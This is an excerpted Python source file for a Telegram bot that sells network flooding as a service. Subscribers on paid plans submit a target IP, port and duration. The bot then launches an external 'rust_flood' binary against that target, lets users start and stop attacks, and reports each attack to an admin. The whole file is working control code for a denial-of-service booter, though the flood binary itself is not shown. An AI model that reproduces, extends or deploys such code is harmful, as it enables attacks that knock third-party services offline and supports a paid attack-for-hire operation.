...
def run_attack_blocking(ip, port, dur, chat_id, username):
    ...
    try:
        current_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        stdout, stderr = current_process.communicate()
        logging.info(f"Output:\n{stdout}")
        if stderr: logging.error(f"Stderr:\n{stderr}")
        msg = "Attack stopped." if forced_stopped else f"Attack finished.\n{ip}:{port} {dur}s"
        bot.send_message(chat_id, msg)
        if chat_id != ADMIN_ID: bot.send_message(ADMIN_ID, f"Attack ended: {ip}:{port} by {username}")
...
def add_user(msg):
    if msg.from_user.id != ADMIN_ID: return bot.reply_to(msg, "⛔ Unauthorized")
    try:
        ...
        bot.reply_to(msg, f"✅ User {uid} plan {plan}")
    except: bot.reply_to(msg, "Usage: /adduser <id> <plan>")

@bot.message_handler(commands=['save'])
def save_cmd(msg):
    user = users_collection.find_one({"user_id": msg.from_user.id})
    if not user or user.get('plan', 0) == 0: return bot.send_message(msg.chat.id, "*Access Denied!*", parse_mode='Markdown')
    bot.send_message(msg.chat.id, "Send: IP PORT DURATION", parse_mode='Markdown')
...
def process_save(msg):
    ...
    try:
        ...
        if port in blocked_ports: return bot.send_message(msg.chat.id, f"Port {port} blocked.")
        target_ip, target_port, duration = ip, port, dur
        bot.send_message(msg.chat.id, "Press 🔥 Start Attack", reply_markup=markup2)
    except: bot.send_message(msg.chat.id, "Invalid. IP PORT DURATION")

@bot.message_handler(func=lambda m: m.text == '🔥 Start Attack')
def start_attack(msg):
    global forced_stopped, current_process
    if not target_ip: return bot.send_message(msg.chat.id, "Use /save first.")
    if current_process and current_process.returncode is None: return bot.send_message(msg.chat.id, "Attack running.")
    forced_stopped = False
    bot.send_message(msg.chat.id, "⚡ Flood started.", reply_markup=markup1)
...
def stop_cb(call):
    ...
    if not current_process or current_process.returncode is not None: return bot.send_message(call.message.chat.id, "No attack.")
    forced_stopped = True
    kill_rust_flood()
    bot.send_message(call.message.chat.id, "Stopped.")

if __name__ == "__main__":
    if not os.path.isfile(RUST_BINARY): logging.error("rust_flood not found."); exit(1)
